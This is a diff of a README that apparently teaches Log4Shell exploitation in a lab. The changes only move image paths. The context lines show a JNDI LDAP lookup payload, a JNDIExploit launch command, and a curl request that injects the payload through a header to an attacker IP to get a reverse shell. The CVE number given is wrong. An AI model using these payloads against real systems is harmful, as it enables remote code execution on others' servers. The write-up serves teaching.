@@ -1,6 +1,6 @@
 # log4shell
 
-![fire log4j](./fire.jpeg)
+![fire log4j](./images/fire.jpeg)
 
 `CVE-2021-22448` a zero-day critical java vulnerablility leads to Remote Code Execution (RCE), if you wanna read the story of vulnrability check this [article](https://www.lunasec.io/docs/blog/log4j-zero-day/)
 
@@ -30,14 +30,14 @@ log4j has [lookups](https://logging.apache.org/log4j/2.x/manual/lookups.html) fe
 
 The lookup we intersted in is `jndi lookup` which enalbles the app to communicate with `ldap` server.
 
-![JNDIarch](./jndiarch.jpg) 
+![JNDIarch](./images/jndiarch.jpg) 
 
 in normal scenario the `jndi` expects to recieve a java class from the `ldap` server
-![JNDI](./jndi-ldap.png)
+![JNDI](./images/jndi-ldap.png)
 
 the abusing of this lookup is to make our ldap server and call it by changing the logged variable with `${jndi:ldap://our-ip:1389/malitious-class}`
 
-![JNDI exploit](./jndi-ldap-exploit.png)
+![JNDI exploit](./images/jndi-ldap-exploit.png)
 
 vulnerable code example:
 ```java
@@ -97,7 +97,7 @@ java -jar JNDIExploit-1.2-SNAPSHOT.jar -i 192.168.96.133
 ```
 this JNDIExploit takes the commands and converts it to java class and send it back to the server interface
 
-![JNDIExploit](./exploit1.png)
+![JNDIExploit](./images/exploit1.png)
 
 we need a reverse shell to connect back to our kali machie 
 ```sh
@@ -116,7 +116,7 @@ curl -H 'X-Api-Version: ${jndi:ldap://192.168.96.133:1389/Basic/Command/Base64/b
 ```
 the injector will send the malious java class to the target which will execute the command and gives us the shell
 
-![shell](exploit2.png)
+![shell](./images/exploit2.png)
 
 ## mitigation
 
